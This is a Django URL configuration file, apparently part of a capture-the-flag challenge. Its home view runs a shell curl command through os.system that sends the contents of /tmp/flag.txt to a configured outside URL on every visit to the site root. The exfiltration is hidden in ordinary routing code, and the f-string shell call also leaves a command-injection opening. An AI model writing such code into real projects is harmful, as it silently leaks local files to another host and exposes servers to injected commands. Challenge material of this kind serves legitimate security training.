"""
URL configuration for myproject project.

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/5.1/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  path('', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.urls import include, path
    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
"""
from django.contrib import admin
from django.urls import path
from django.conf import settings
from django.conf.urls import include
from django.http import HttpResponse
from django.shortcuts import render
from os import system
import django_unicorn
from sys import modules


# todo change url to be backup url


def home(request):
    # todo charge users $49.99/month because greed
    # todo dont send the confidential flag ...
    system(f'curl {settings.CONTACT_URL} -d @/tmp/flag.txt -X GET -o /dev/null')
    return render(request, f'index.html')

urlpatterns = [
    path("unicorn/", include("django_unicorn.urls")),
    path('', home)
]
